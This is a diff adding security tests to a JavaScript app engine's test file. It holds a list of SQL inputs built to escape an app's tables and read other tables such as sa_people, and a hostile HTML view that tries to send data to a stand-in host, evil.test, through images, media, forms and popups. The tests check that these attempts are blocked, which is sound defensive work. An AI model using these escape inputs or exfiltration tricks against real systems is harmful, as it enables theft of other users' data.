@@ -49,6 +49,59 @@ test('only SELECTs over the app\'s own tables', () => {
   assert.throws(() => rewriteSql('SELECT 1; DROP TABLE tasks', T, P), /one statement/);
 });
 
+// Audit G-B1: each of these reached another table unchecked. Every one must
+// be refused, whatever the message.
+test('app.sql cannot reach a table outside the app by quoting, commas, comments or odd tokens', () => {
+  const reach = [
+    'SELECT * FROM "sa_people"',
+    'SELECT * FROM `sa_people`',
+    'SELECT * FROM tasks, sa_people',
+    'SELECT * FROM tasks t, sa_people p WHERE t.id = p.id',
+    'SELECT * FROM tasks JOIN tags ON tags.task = tasks.id, sa_people',
+    'SELECT * FROM/**/sa_people',
+    'SELECT * FROM /* x */ sa_people',
+    'SELECT * FROM tasks WHERE id IN (SELECT id FROM/**/sa_sessions)',
+    // A CTE's name counts only inside the query that defines it.
+    'SELECT * FROM sa_people, (WITH sa_people AS (SELECT 1 AS x) SELECT * FROM sa_people) q',
+    'SELECT * FROM (WITH sa_people AS (SELECT 1 AS x) SELECT * FROM sa_people) q, sa_people',
+    // The tokenizer must end strings where ChloeDB's (sqlparser) does.
+    "SELECT E'x\\'' AS a, (SELECT email FROM sa_people) AS b, ''' AS c FROM tasks",
+    "SELECT $$ ' $$ AS a FROM sa_people --'",
+    "SELECT R'x' AS a FROM tasks",
+    // Number forms that end before a keyword: 1L, 0x, "1." then FROM.
+    'SELECT 1LFROM sa_people',
+    'SELECT 1.FROM sa_people',
+    'SELECT * FROM tasks 0xJOIN sa_people ON 1 = 1',
+    // Other ways to name a table.
+    'FROM sa_people SELECT *',
+    '(TABLE sa_people)',
+    'SELECT * FROM tasks |> JOIN sa_people ON 1 = 1',
+    'SELECT * FROM main.sa_people',
+    'SELECT * FROM tasks CROSS APPLY sa_people',
+    'SELECT * INTO sa_copy FROM tasks',
+    'SELECT * FROM LATERAL sa_people',
+    'SELECT * FROM (sa_people)',
+  ];
+  for (const sql of reach) {
+    assert.throws(() => rewriteSql(sql, T, P), Error, sql);
+  }
+  // And the shapes apps write stay as they were.
+  assert.equal(rewriteSql('SELECT * FROM tasks, tags WHERE tags.task = tasks.id', T, P).sql,
+    'SELECT * FROM app_abc123_tasks AS tasks, app_abc123_tags AS tags WHERE tags.task = tasks.id');
+  assert.equal(rewriteSql('SELECT "title" FROM tasks -- the list\n', T, P).sql,
+    'SELECT "title" FROM app_abc123_tasks AS tasks -- the list');
+  assert.equal(rewriteSql('SELECT x IS DISTINCT FROM y AS d, SUBSTRING(title FROM 2) AS s, TRIM(BOTH FROM title) AS t FROM tasks', T, P).sql,
+    'SELECT x IS DISTINCT FROM y AS d, SUBSTRING(title FROM 2) AS s, TRIM(BOTH FROM title) AS t FROM app_abc123_tasks AS tasks');
+  assert.equal(rewriteSql('SELECT * FROM (SELECT * FROM tasks) t JOIN (SELECT * FROM tags) g ON g.task = t.id', T, P).sql,
+    'SELECT * FROM (SELECT * FROM app_abc123_tasks AS tasks) t JOIN (SELECT * FROM app_abc123_tags AS tags) g ON g.task = t.id');
+  assert.equal(rewriteSql('SELECT t.from, :from AS f FROM tasks t WHERE t.at >= :from', T, P).sql,
+    'SELECT t.from, :from AS f FROM app_abc123_tasks t WHERE t.at >= :from');
+  assert.equal(rewriteSql('WITH a AS (SELECT * FROM tasks), b (n) AS (SELECT COUNT(*) FROM a) SELECT * FROM a, b', T, P).sql,
+    'WITH a AS (SELECT * FROM app_abc123_tasks AS tasks), b (n) AS (SELECT COUNT(*) FROM a) SELECT * FROM a, b');
+  assert.equal(rewriteSql('SELECT title FROM tasks UNION ALL SELECT name FROM people ORDER BY 1', T, P).sql,
+    'SELECT title FROM app_abc123_tasks AS tasks UNION ALL SELECT name FROM app_abc123_people AS people ORDER BY 1');
+});
+
 test('the answer parser keeps code verbatim', () => {
   const text = '<plan>{"views":[{"slug":"v1"}]}</plan>\n<code slug="v1">\nconst x = "</div>";\nroot.append(x)\n</code>';
   const { plan, code } = parseAnswer(text);
@@ -1587,6 +1640,97 @@ test('the library SQL functions run in Strata', async (t) => {
   }
 });
 
+// Audit G-B1's backstop: whatever the rewrite lets through, the server's
+// plan says which tables a query reads, and one outside the app's is refused.
+test('the server\'s plan of an app query may read only the app\'s tables', async (t) => {
+  const { findServerBinary, startServer } = await import('../engine/strata.mjs');
+  const { checkReads, tablesOfPlan } = await import('../engine/sql.mjs');
+  const bin = findServerBinary(join(import.meta.dirname, '..', '..'));
+  if (!bin) return noServer(t);
+  const dir = mkdtempSync(join(tmpdir(), 'sa-reads-'));
+  const port = await new Promise((r) => { const s = net.createServer().listen(0, '127.0.0.1', () => { const p = s.address().port; s.close(() => r(p)); }); });
+  const { child, client } = await startServer({ bin, db: join(dir, 'apps.strata'), listen: `127.0.0.1:${port}`, log: () => {} });
+  try {
+    await client.sql('CREATE TABLE app_x1_tasks (id KEYWORD PRIMARY KEY, title TEXT)');
+    await client.sql('CREATE TABLE sa_people (id KEYWORD PRIMARY KEY, email KEYWORD)');
+    await client.write([{ op: 'upsert', table: 'app_x1_tasks', doc: { id: 'a', title: 'one' } }, { op: 'upsert', table: 'sa_people', doc: { id: 'a', email: 'x@example.com' } }]);
+    const own = ['app_x1_tasks'];
+    await checkReads(client, 'SELECT * FROM app_x1_tasks AS tasks', {}, own);
+    assert.deepEqual([...tablesOfPlan((await client.explain('SELECT * FROM app_x1_tasks AS tasks', {})).ir)], ['app_x1_tasks']);
+    await assert.rejects(checkReads(client, 'SELECT * FROM "sa_people"', {}, own), /reads sa_people/);
+    await assert.rejects(checkReads(client, 'SELECT * FROM app_x1_tasks AS tasks JOIN "sa_people" p ON p.id = tasks.id', {}, own), /reads sa_people/);
+    await assert.rejects(checkReads(client, 'SELECT * FROM app_x1_tasks WHERE id IN (SELECT id FROM sa_people)', {}, own), /reads sa_people/);
+    await assert.rejects(checkReads(client, 'WITH p AS (SELECT * FROM sa_people) SELECT * FROM p', {}, own), /reads sa_people/);
+    // And through the engine, as a view's app.sql reaches it.
+    const { Engine } = await import('../engine/engine.mjs');
+    const engine = new Engine(client, { log: () => {} });
+    engine.view = async () => ({ tables: [{ spec: { name: 'tasks' } }] });
+    assert.deepEqual((await engine.sql('x1', 'SELECT title FROM tasks')).map((r) => r.title), ['one']);
+    await assert.rejects(engine.sql('x1', 'SELECT * FROM tasks JOIN "sa_people" p ON p.id = tasks.id'), /quotes/);
+    await assert.rejects(engine.sql('x1', 'SELECT * FROM tasks WHERE id IN (SELECT id FROM/**/sa_people)'), /block comments/);
+  } finally {
+    child.kill();
+  }
+});
+
+// Audit G-B2: a view's frame sent rows out through an image's URL or a popup.
+// In Chromium, a frame with the studio's sandbox and policy runs what a
+// hostile view would, and nothing reaches another host.
+test('a view frame cannot send data out through images, media, forms or popups', async (t) => {
+  const { frameCsp, FRAME_SANDBOX, linkToOpen, PHOTO_HOSTS } = await import('../web/policy.js');
+  const csp = frameCsp('http://127.0.0.1:1');
+  assert.doesNotMatch(csp, /img-src[^;]*https:(\s|;|$)/);
+  assert.match(csp, /form-action 'none'/);
+  assert.match(frameCsp('http://127.0.0.1:1', { hosts: ['*'] }), /img-src data: blob: http:\/\/127\.0\.0\.1:1 https:;/);
+  // Allowed hosts (and their subdomains) only; a name that is not a host adds nothing.
+  const some = frameCsp('http://127.0.0.1:1', { hosts: ['api.example.com', "x.com; script-src *", 'bad host'] });
+  assert.match(some, /img-src [^;]* https:\/\/api\.example\.com https:\/\/\*\.api\.example\.com;/);
+  assert.doesNotMatch(some, /img-src[^;]*https:(\s|;|$)|x\.com|bad/);
+  assert.ok(PHOTO_HOSTS.every((h) => csp.includes(h)));
+  assert.doesNotMatch(FRAME_SANDBOX, /allow-popups|allow-same-origin|allow-top-navigation/);
+  assert.equal(linkToOpen('javascript:alert(1)'), null);
+  assert.equal(linkToOpen('https://example.com/a'), 'https://example.com/a');
+  const { loadPlaywright } = await import('../engine/checks.mjs');
+  const pw = loadPlaywright();
+  if (!pw) return t.skip('no playwright');
+  const browser = await pw.chromium.launch();
+  try {
+    // A hostile view, in a frame made as the studio makes one.
+    const view = `<!doctype html><html><head><meta http-equiv="Content-Security-Policy" content="${frameCsp('https://studio.test')}"></head><body>
+<form id="f" action="https://evil.test/form" method="get"><input name="rows" value="secret"></form>
+<a id="l" href="https://evil.test/link?rows=secret" target="_blank">x</a>
+<script>
+  new Image().src = 'https://evil.test/img?rows=secret';
+  const v = document.createElement('video'); v.src = 'https://evil.test/media?rows=secret'; document.body.append(v);
+  try { window.open('https://evil.test/open?rows=secret'); } catch (e) {}
+  try { document.getElementById('f').submit(); } catch (e) {}
+  new Image().src = 'https://studio.test/api/tiles/1/0/0.png';
+</script></body></html>`;
+    const ctx = await browser.newContext();
+    const seen = [];
+    await ctx.route('**/*', (r) => {
+      const u = r.request().url();
+      seen.push(u);
+      return r.fulfill(u === 'https://studio.test/' ? { contentType: 'text/html', body: '<!doctype html><body></body>' } : { status: 204, body: '' });
+    });
+    const page = await ctx.newPage();
+    await page.goto('https://studio.test/');
+    await page.evaluate(([sandbox, doc]) => {
+      const f = document.createElement('iframe');
+      f.setAttribute('sandbox', sandbox);
+      f.srcdoc = doc;
+      document.body.append(f);
+    }, [FRAME_SANDBOX, view]);
+    await page.waitForTimeout(800);
+    await page.frames()[1].click('#l', { timeout: 2000 }).catch(() => {});
+    await page.waitForTimeout(800);
+    assert.deepEqual(seen.filter((u) => u.includes('evil.test')), []);
+    assert.deepEqual(ctx.pages().length, 1);
+    // An image from the engine itself still loads.
+    assert.ok(seen.includes('https://studio.test/api/tiles/1/0/0.png'), seen.join(' '));
+  } finally { await browser.close(); }
+});
+
 // Against a real chloedb-server: what people do is stored with its columns
 // (session, screen, table, row, fields, words, results, time), and Strata
 // counts the patterns in it with the engine's table functions.
@@ -2233,6 +2377,98 @@ test('the engine\'s own browser opens the app with its cookie', async (t) => {
     useSelfCookie(null);
     srv.close();
   }
+});
+
+// What an app is made of (engine/provenance.mjs): the lines the engine
+// generated from CREATE statements, the agent's own code, and the library's.
+test('provenance tells CREATE statements from code written from scratch and from reused pieces', async () => {
+  const { provenance, pieceOrigin } = await import('../engine/provenance.mjs');
+  const { fromSource, toSource } = await import('../engine/source.mjs');
+  const statement = `CREATE SCREEN guests TITLE 'Guests'
+LIST guests
+  ORDER BY name  SEARCH name
+  FORM (name REQUIRED, rsvp 'RSVP' SELECT ('yes', 'no'))
+  COLUMNS (name, rsvp 'RSVP' BADGE)
+  KPI 'Coming' = COUNT(*) WHERE rsvp = 'yes'`;
+  // A capability as the engine holds it: its SQL, and what it runs as.
+  const held = (c) => { const sql = toSource(c); const run = fromSource({ ...c, code: sql }); return { ...c, code: run.code, sql: run.sql, spec: { ...c.spec, ...(run.statement ? { statement: run.statement } : {}) } }; };
+  const screen = held({ id: 'a1/view/guests@1', kind: 'view', slug: 'guests', title: 'Guests', version: 1, author: 'forge', code: statement, spec: { screen: true, patterns: ['crud'] } });
+  const js = held({ id: 'a1/view/chart@1', kind: 'view', slug: 'chart', title: 'Chart', version: 1, author: 'forge', code: 'async function render(root, app) {\n  const rows = await app.sql("SELECT * FROM guests");\n\n  root.textContent = rows.length;\n}', spec: {} });
+  const table = held({ id: 'a1/table/guests@1', kind: 'table', slug: 'guests', title: 'guests', version: 1, author: 'forge', code: '', spec: { name: 'guests', columns: [{ name: 'name', type: 'text' }, { name: 'rsvp', type: 'keyword' }] } });
+  const starter = held({ id: 'a1/function/export-csv@1', kind: 'function', slug: 'export-csv', title: 'Export', version: 1, author: 'library', forked_from: 'lib/function/export-csv@1', code: 'async function run(input, app) {\n  return 1;\n}', spec: {} });
+  const builtin = { id: 'lib/component/barChart@1', kind: 'component', slug: 'barChart', title: 'Bar chart', version: 1, author: 'builtin', code: 'function component() {\n  return 1;\n}', spec: {} };
+  const mine = { id: 'lib/helper/odds@1', kind: 'helper', slug: 'odds', title: 'Odds', version: 1, author: 'forge', code: 'function helper() {\n  return {};\n}', spec: { by: 'a1' } };
+
+  const s = pieceOrigin(screen, 'a1');
+  assert.equal(s.origin, 'create');
+  assert.equal(s.statement, 'CREATE SCREEN');
+  assert.equal(s.wrote, 6);
+  assert.ok(s.runs > s.wrote * 3, `a CREATE SCREEN expands into its pattern's screen (${s.wrote} -> ${s.runs})`);
+  assert.deepEqual([pieceOrigin(js, 'a1').origin, pieceOrigin(js, 'a1').wrote], ['scratch', 4]);
+  assert.equal(pieceOrigin(table, 'a1').statement, 'CREATE TABLE');
+  assert.deepEqual([pieceOrigin(starter, 'a1').origin, pieceOrigin(starter, 'a1').wrote], ['reused', 0]);
+  assert.equal(pieceOrigin(builtin, 'a1').origin, 'reused');
+  assert.equal(pieceOrigin(mine, 'a1').origin, 'scratch');
+  assert.equal(pieceOrigin(mine, 'other').origin, 'reused', 'a shared piece another app wrote is reused');
+  // A screen patched since it was written as a statement is JSON the agent wrote.
+  assert.equal(pieceOrigin({ ...screen, spec: { ...screen.spec, derived: true } }, 'a1').origin, 'scratch');
+
+  const m = provenance({ app: { id: 'a1' }, comp: { n: 3 }, tables: [table], views: [screen, js], functions: [starter], components: [builtin], helpers: [mine] });
+  assert.equal(m.version, 3);
+  assert.equal(m.pieces.length, 6);
+  assert.equal(m.runs, m.pieces.reduce((a, p) => a + p.runs, 0));
+  const shares = Object.values(m.totals).reduce((a, t) => a + t.share, 0);
+  assert.ok(Math.abs(shares - 1) < 1e-9);
+  assert.equal(m.agent.wrote, m.totals.create.wrote + m.totals.scratch.wrote);
+  assert.ok(m.leverage > 1);
+  assert.deepEqual(m.pieces.map((p) => p.origin).slice(0, 2), ['create', 'create'], 'statements first');
+});
+
+test('a published app is open to the public at its own host, and nothing else is', async () => {
+  const { Publish, nameFor } = await import('../engine/publish.mjs');
+  assert.equal(nameFor("Kids' reading"), 'kids-reading');
+  assert.equal(nameFor('Café — Orders!'), 'cafe-orders');
+  assert.equal(nameFor('API'), 'app-api');
+  const rows = new Map();
+  const store = { db: { query: async () => [...rows].map(([app, value]) => ({ app, value })) }, putSetting: async (app, name, value) => rows.set(app, value) };
+  const pub = new Publish({ store, domain: 'apps.example.com', rate: { calls: 5, dear: 2 } });
+  await pub.load(true);
+  const req = (method, host, extra = {}) => ({ method, headers: { host, ...extra }, socket: { remoteAddress: '203.0.113.9' } });
+  const at = (p) => new URL(p, 'http://x');
+  // Not published: nothing of it is open.
+  assert.equal(await pub.allows(req('GET', 'engine:7730'), at('/a/a1')), null);
+  const out = await pub.set('a1', "Kids' reading", { on: true });
+  assert.deepEqual(out.urls, ['https://kids-reading.apps.example.com/']);
+  await assert.rejects(pub.set('a2', 'Other', { on: true, name: 'kids-reading' }), /another app is called/);
+  await assert.rejects(pub.set('a2', 'Other', { name: 'www' }), /kept for the service/);
+  await assert.rejects(pub.set('a2', 'Other', { hosts: ['x.apps.example.com'] }), /not a host of your own/);
+  assert.equal((await pub.set('a2', 'Other', { on: true, hosts: ['Books.Example.org.'] })).hosts[0], 'books.example.org');
+  const host = 'kids-reading.apps.example.com';
+  assert.equal(pub.appForHost(req('GET', `${host}:443`)), 'a1');
+  assert.equal(pub.appForHost(req('GET', 'books.example.org')), 'a2');
+  assert.deepEqual(await pub.allows(req('GET', host), at('/')), { app: 'a1', page: true });
+  assert.ok(await pub.allows(req('GET', 'engine'), at('/a/a1')));
+  assert.ok(await pub.allows(req('GET', host), at('/api/apps/a1')));
+  assert.ok((await pub.allows(req('POST', host), at('/api/apps/a1/insert'))).app === 'a1');
+  assert.ok((await pub.allows(req('POST', host), at('/api/apps/a1/ask'))).dear);
+  assert.ok((await pub.allows(req('GET', host), at('/studio.js'))).file);
+  // How it is made, other apps, versions to try and the studio's own calls stay shut.
+  for (const [m, p, h] of [['GET', '/api/apps', host], ['POST', '/api/apps/a1/requests', host], ['GET', '/api/apps/a1/activity', host],
+    ['POST', '/api/apps/a1/publish', host], ['GET', '/api/apps/a1?v=2', host], ['GET', '/api/apps/a2', host], ['GET', '/api/kit', host],
+    ['GET', '/', 'engine'], ['GET', '/api/stream', host], ['POST', '/api/apps/a1/screens/books', host]]) {
+    assert.equal(await pub.allows(req(m, h), at(p)), null, `${m} ${p} on ${h}`);
+  }
+  assert.ok(await pub.allows(req('GET', host), at('/api/stream?app=a1')));
+  // A visitor's rate: 5 calls a minute, 2 of them dear.
+  const r = req('POST', host, { 'x-forwarded-for': '198.51.100.7, 10.0.0.1' });
+  assert.equal(pub.limit(r, true), null);
+  assert.equal(pub.limit(r, true), null);
+  assert.ok(pub.limit(r, true) > 0);
+  assert.equal(pub.limit(req('POST', host, { 'x-forwarded-for': '198.51.100.8' }), false), null);
+  // Switched off: shut again, at every address.
+  await pub.set('a1', "Kids' reading", { on: false });
+  assert.equal(await pub.allows(req('GET', host), at('/')), null);
+  assert.equal(await pub.allows(req('GET', 'engine'), at('/a/a1')), null);
 });
 
 test('schedules: EVERY read and said back, the next time in a time zone, and a run missed while away runs once', async () => {
